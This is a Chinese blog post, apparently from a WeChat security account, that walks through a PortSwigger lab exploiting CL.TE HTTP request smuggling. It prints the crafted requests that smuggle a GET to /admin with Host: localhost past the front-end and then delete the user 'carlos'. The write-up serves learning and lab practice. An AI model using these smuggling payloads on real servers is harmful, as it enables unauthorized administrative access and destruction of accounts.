#  【Tips】利用HTTP 请求走私绕过前端安全控制、CL.TE 漏洞

原创 Beret-Sec  [ 贝雷帽SEC ](javascript:void\(0\);)

**贝雷帽SEC** ![]()

微信号 Beret-Sec

功能介绍 网络安全爱好者，记录、分享网络安全方面的相关知识~

____

___发表于_

收录于合集

#每日技能+1 20 个

#WEB 安全 9 个

  
![]()

**Tips +1  
**

![]()

  

#  **利用HTTP 请求走私绕过前端安全控制、CL.TE 漏洞**

  

  * 

    
    
     环境地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

实验场景：本实验涉及前端和后端服务器，前端服务器不支持分块编码。上有一个管理面板/admin，但前端服务器阻止对其进行访问。

要解决该实验，请将请求偷偷发送到访问管理面板并删除用户的后端服务器carlos。  

1、访问admin 没有权限，这里需要把http 设置为1  

![]()

2、构造请求包发送两个可绕过前端服务器，但是这里限制了本地用户访问

![]()

![]()

3、添加hocalhost 绕过限制，但是该请求由于第二个请求的 Host 标头与第一个请求中走私的 Host 标头冲突而被阻止。

    
    
    POST / HTTP/1.1  
    Host: 0a7c0004048a64ac816f7aab004e0091.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 54  
    Transfer-Encoding: chunked  
      
    0  
      
    GET /admin HTTP/1.1  
    Host: localhost  
    X-Ignore: X  
    

![]()

4、发出以下请求两次，以便将第二个请求的标头附加到走私的请求正文中，请求成功如下

    
    
    POST / HTTP/1.1  
    Host: 0a7c0004048a64ac816f7aab004e0091.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 116  
    Transfer-Encoding: chunked  
      
    0  
      
    GET /admin HTTP/1.1  
    Host: localhost  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 10  
      
    x=

![]()

5、查看请求响应，我们可以将走私的请求URL改为 删除 carlos用户

![]()

    
    
    POST / HTTP/1.1  
    Host: 0a7c0004048a64ac816f7aab004e0091.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 116  
    Transfer-Encoding: chunked  
      
    0  
      
    GET /admin/delete?username=carlos HTTP/1.1  
    Host: localhost  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 10  
      
    x=  
      
    

![]()

![]()

删除成功，完成该关卡

![]()

  

  

                                        

End

  

“点赞、在看与分享都是莫大的支持”  

  

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

